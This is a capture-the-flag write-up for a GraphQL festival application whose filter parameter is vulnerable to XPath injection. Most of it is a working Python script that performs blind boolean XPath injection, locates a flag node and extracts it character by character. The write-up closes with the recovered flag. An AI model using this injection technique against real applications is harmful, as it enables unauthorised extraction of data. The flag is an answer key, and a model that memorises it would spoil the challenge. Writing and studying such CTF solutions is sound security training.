Graphql introspection is enabled on the application.
There is a custom queryType called XMLQuery which sort of hints at the next part of the challenge.

The `FestivalFilter` parameter in festival query is vulnerable to XPATH injection.
We can then leak the entire XML document to get the flag.

```python
import requests, urllib.parse, json

base='http://festivals.ctf.zone/graphql'

def run(q):
    url=base+'?'+urllib.parse.urlencode({'query': q})
    r=requests.get(url, timeout=10)
    try:
        return r.json()
    except Exception:
        print('bad json', r.text[:200]); return None

def is_true(xpath_condition):
    inj = "' or (" + xpath_condition + ") or '"
    q = f'{{ festival(filter: {{ id: {json.dumps(inj)} }} ) {{ name }} }}'
    data = run(q)
    if not data or 'data' not in data:
        print('resp', data); return False
    arr = data['data']['festival']
    return isinstance(arr, list) and len(arr) > 1

# helpers
def cmp_len(expr, target):
    return is_true(f'string-length({expr}) = {target}')

def char_is(expr, i, ch):
    ch = ch.replace('"','\\"')
    return is_true(f'substring({expr}, {i}, 1) = "{ch}"')

def get_len(expr, lo=1, hi=512):
    L, R = lo, hi
    while L < R:
        mid = (L+R)//2
        if is_true(f'string-length({expr}) > {mid}'):
            L = mid+1
        else:
            R = mid
    return L if cmp_len(expr, L) else 0

def dump_string(expr, length, charset):
    out=[]
    for i in range(1, length+1):
        found=None
        for ch in charset:
            if char_is(expr, i, ch):
                out.append(ch); found=ch
                print(f"[{i}/{length}] -> {ch}    current: {''.join(out)}")
                break
        if found is None:
            out.append('?')
            print(f"[{i}/{length}] -> ?    current: {''.join(out)}")
    return ''.join(out)

# scan candidates: text(), comment(), attributes
def count_nodes(xpath):
    L,R=0,2048
    while L<R:
        mid=(L+R+1)//2
        if is_true(f'count({xpath}) >= {mid}'):
            L=mid
        else:
            R=mid-1
    return L

def find_flag_expr():
    def has_flag_prefix(expr):
        # prefix 'flag{'
        return is_true(
            f'starts-with(translate({expr},"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"), "flag{{")'
        )
    # 1) text nodes
    n_text = count_nodes('//text()')
    for i in range(1, n_text+1):
        expr = f'string(normalize-space((//text())[position()={i}]))'
        if has_flag_prefix(expr):
            return expr
    # 2) comments
    n_com = count_nodes('//comment()')
    for i in range(1, n_com+1):
        expr = f'string(normalize-space((//comment())[position()={i}]))'
        if has_flag_prefix(expr):
            return expr
    # 3) attributes
    n_attr = count_nodes('//@*')
    for i in range(1, n_attr+1):
        expr = f'string(normalize-space((//@*)[position()={i}]))'
        if has_flag_prefix(expr):
            return expr
    return None

# run
expr = find_flag_expr()
if not expr:
    print('No node starting with flag{ found'); raise SystemExit

length = get_len(expr, lo=6, hi=512)  # flag{...} so min 6 incl trailing }
print('candidate length:', length, 'expr:', expr)

# Try a smart charset ordering (likely chars first)
charset = list('flagFLAG{}_') + \
          list('abcdefghijklmnopqrstuvwxyz') + \
          list('ABCDEFGHIJKLMNOPQRSTUVWXYZ') + \
          list('0123456789') + \
          list('-.:/@#$%^&*()!+[]<>?=')

flag = dump_string(expr, length, charset)
print('FLAG:', flag)
```

Flag: `flag{6bb7325ab7e9e15cdfe30c0ccee79216}`

Solved by: vicevirus